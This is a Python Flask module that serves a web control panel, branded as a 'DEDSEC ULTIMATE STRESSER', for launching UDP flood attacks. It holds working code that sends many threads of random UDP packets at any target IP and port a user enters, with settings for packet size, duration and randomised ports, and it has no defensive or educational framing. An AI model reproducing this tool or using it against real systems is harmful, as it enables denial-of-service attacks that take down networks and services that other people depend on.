from flask import Blueprint, request
import socket
import random
import threading
import time
from datetime import datetime

script4_bp = Blueprint('script4', __name__)

# Global variable to control the attack
attack_running = False
log_messages = []

def udp_flood(ip, port, duration, size):
    global attack_running
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(size)
    timeout = time.time() + duration
    sent = 0
    
    while time.time() < timeout and attack_running:
        try:
            # Randomizing port if 0 is selected
            target_port = port if port != 0 else random.randint(1, 65535)
            client.sendto(bytes_payload, (ip, target_port))
            sent += 1
        except Exception as e:
            break
    client.close()

@script4_bp.route("/", methods=["GET", "POST"])
def index():
    global attack_running, log_messages
    status_msg = ""

    if request.method == "POST":
        action = request.form.get("action")
        
        if action == "START":
            target_ip = request.form.get("ip")
            target_port = int(request.form.get("port", 80))
            threads = int(request.form.get("threads", 10))
            duration = int(request.form.get("duration", 60))
            packet_size = int(request.form.get("size", 1024))

            if target_ip:
                attack_running = True
                log_messages = [f"[*] Flood started on {target_ip}:{target_port} at {datetime.now().strftime('%H:%M:%S')}"]
                
                # Launching Multiple Threads for Power
                for _ in range(threads):
                    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, packet_size))
                    thread.daemon = True
                    thread.start()
                
                status_msg = f"🚀 Attack Launched on {target_ip}!"
            else:
                status_msg = "❌ Error: Target IP missing!"

        elif action == "STOP":
            attack_running = False
            status_msg = "🛑 Attack Terminated."

    return f"""
    <div style="background:#000; color:#ff3e3e; font-family:'Courier New', monospace; padding:20px; min-height:100vh; border: 3px solid #ff3e3e;">
        <h1 style="text-align:center; color:#fff; text-shadow: 0 0 10px #ff3e3e;">🔥 FL00D 3.0 - DEDSEC ULTIMATE STRESSER 🔥</h1>
        <p style="text-align:center; color:#888;">#T4ke_7hem_d0wn | #AndroSec1337 | #CyberMasterPro</p>
        
        <form method="POST" style="background:#111; padding:20px; border:1px solid #333; border-radius:10px; max-width:600px; margin:auto;">
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
                <label>Target IP:</label>
                <input name="ip" placeholder="127.0.0.1" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                
                <label>Port (0=Mixed):</label>
                <input name="port" type="number" value="80" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                
                <label>Threads (Power):</label>
                <input name="threads" type="number" value="50" max="200" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                
                <label>Packet Size (Bytes):</label>
                <input name="size" type="number" value="1250" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                
                <label>Duration (Sec):</label>
                <input name="duration" type="number" value="60" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
            </div>
            <br>
            <div style="text-align:center;">
                <button name="action" value="START" style="background:#ff3e3e; color:#fff; border:none; padding:10px 30px; cursor:pointer; font-weight:bold;">EXECUTE ATTACK</button>
                <button name="action" value="STOP" style="background:#fff; color:#000; border:none; padding:10px 30px; cursor:pointer; font-weight:bold; margin-left:10px;">STOP</button>
            </div>
        </form>

        <div style="margin-top:20px; background:#050505; border:1px solid #333; padding:15px; height:150px; overflow-y:auto; font-size:12px;">
            <b style="color:#fff;">[ SYSTEM LOGS ]</b><br>
            {status_msg}<br>
            {"<br>".join(log_messages)}
            {f"<br><span style='color:yellow;'>[!] Flooding in progress... Sending heavy UDP packets...</span>" if attack_running else ""}
        </div>
        
        <br>
        <div style="text-align:center;">
            <a href="/" style="color:#ff3e3e; text-decoration:none;">[ RETURN TO MAIN DASHBOARD ]</a>
        </div>
    </div>
    """
